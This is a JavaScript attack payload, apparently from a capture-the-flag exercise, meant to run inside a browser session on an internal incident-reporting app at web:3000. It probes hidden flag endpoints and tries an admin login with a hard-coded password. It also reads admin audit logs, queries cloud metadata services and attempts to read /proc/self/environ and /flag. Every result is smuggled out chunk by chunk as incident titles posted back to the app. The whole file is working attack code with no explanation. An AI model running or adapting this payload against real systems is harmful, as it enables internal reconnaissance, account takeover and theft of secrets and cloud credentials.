// Probe internal service at web:3000
(async () => {
  var O = self.location.origin; // http://web:3000
  var P = function(t) {
    return fetch(O + '/api/incidents', {
      method: 'POST', credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ title: String(t).slice(0, 105), facility: 'Meridian-2', severity: 'Watch' })
    }).catch(function() {});
  };

  await P('P7|START|' + O);

  // Try internal flag endpoints
  var urls = [
    O + '/flag',
    O + '/flag.txt',
    O + '/api/flag',
    O + '/api/cat',
    O + '/api/admin/flag',
    O + '/api/admin/cat',
    O + '/api/pwned',
    O + '/cat',
    'http://web:3000/flag',
    'http://web:3000/api/flag',
    'http://web:3000/cat',
    'http://flag:3000/',
    'http://flag/',
  ];

  for (var i = 0; i < urls.length; i++) {
    try {
      var r = await fetch(urls[i], {credentials: 'same-origin'});
      var t = await r.text();
      await P('P7|URL|' + urls[i].replace(O,'') + '|' + r.status + '|' + t.slice(0, 55));
    } catch(e) {
      await P('P7|ERR|' + urls[i].replace(O,'') + '|' + String(e).slice(0, 55));
    }
  }

  // Try login as admin with Summer2025! from INSIDE the network
  try {
    var lr = await fetch(O + '/api/auth/login', {
      method: 'POST', credentials: 'same-origin',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: 'admin@aegiscore-response.com', password: 'Summer2025!'})
    });
    var lj = await lr.json();
    await P('P7|ADM|' + lr.status + '|' + JSON.stringify(lj).slice(0, 70));
  } catch(e) { await P('P7|ADMERR|' + e); }

  // Read fresh audit entry 2 directly
  try {
    var ar = await fetch(O + '/api/admin/audit?log=2', {credentials: 'same-origin'});
    var at = await ar.text();
    await P('P7|AUD2|' + ar.status + '|' + at.slice(0, 70));
    // If we can read it (developer might access internally), dump the body
    if (ar.status === 200 || at.indexOf('request_dump') > -1) {
      var n = Math.ceil(at.length / 80);
      for (var c = 0; c < n && c < 20; c++) {
        await P('P7|AD|' + (c+1) + '/' + n + '|' + at.slice(c*80, (c+1)*80));
      }
    }
  } catch(e) {}

  // Try accessing internal docker/kubernetes metadata
  var meta = [
    'http://169.254.169.254/latest/meta-data/',
    'http://metadata.google.internal/computeMetadata/v1/',
  ];
  for (var m = 0; m < meta.length; m++) {
    try {
      var r = await fetch(meta[m]);
      await P('P7|META|' + r.status + '|' + (await r.text()).slice(0, 60));
    } catch(e) {}
  }

  // env vars via /proc
  try {
    var r = await fetch('file:///proc/self/environ');
    await P('P7|ENV|' + r.status + '|' + (await r.text()).slice(0, 60));
  } catch(e) { await P('P7|ENVF|' + String(e).slice(0, 60)); }

  // Try /flag file
  try {
    var r = await fetch('file:///flag');
    await P('P7|FILE|' + r.status + '|' + (await r.text()).slice(0, 60));
  } catch(e) { await P('P7|FILEF|' + String(e).slice(0, 60)); }

  await P('P7|DONE');
})();
